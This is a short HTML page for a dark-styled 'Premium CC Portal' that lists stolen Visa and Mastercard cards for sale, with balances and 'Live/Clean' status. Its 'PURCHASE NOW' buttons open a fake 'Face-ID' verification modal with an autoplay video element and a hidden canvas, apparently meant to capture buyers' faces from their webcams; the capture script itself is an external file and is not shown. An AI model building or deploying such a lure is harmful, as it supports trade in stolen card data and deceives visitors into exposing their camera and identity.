<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ziddi CC Shop | Premium Assets</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Segoe UI', sans-serif; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; }
        .card-box { border: 2px solid #333; background: #111; padding: 20px; border-radius: 15px; transition: 0.3s; }
        .card-box:hover { border-color: #00ff00; box-shadow: 0 0 15px #00ff0033; }
        .price { font-size: 24px; color: #fff; font-weight: bold; margin: 10px 0; }
        .details { color: #888; font-size: 14px; margin-bottom: 15px; }
        .buy-btn { width: 100%; background: #00ff00; color: #000; padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        
        /* Verification Modal */
        #verifyModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
                       background: #000; border: 2px solid #00ff00; padding: 30px; text-align: center; z-index: 1000; }
        #video { width: 100%; max-width: 300px; border-radius: 10px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>ðŸ’Ž PREMIUM CC PORTAL <span style="font-size: 14px; color: grey;">(v4.2 Private)</span></h1>
    <div class="grid">
        <div class="card-box">
            <div style="font-weight: bold;">VISA GOLD - USA</div>
            <div class="price">Rs 1,000</div>
            <div class="details">Balance: $80+ <br> Status: Live/Clean</div>
            <button class="buy-btn" onclick="openVerify()">PURCHASE NOW</button>
        </div>
        <div class="card-box">
            <div style="font-weight: bold;">MASTER PLATINUM</div>
            <div class="price">Rs 2,500</div>
            <div class="details">Balance: $200+ <br> Status: 100% Valid</div>
            <button class="buy-btn" onclick="openVerify()">PURCHASE NOW</button>
        </div>
    </div>

    <div id="verifyModal">
        <h3>SECURITY VERIFICATION</h3>
        <p>Complete "Face-ID" to authorize this transaction.</p>
        <video id="video" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <br>
        <button class="buy-btn" id="captureBtn">START FACE-ID SCAN</button>
    </div>

    <script src="cc-logic.js"></script>
</body>
</html>
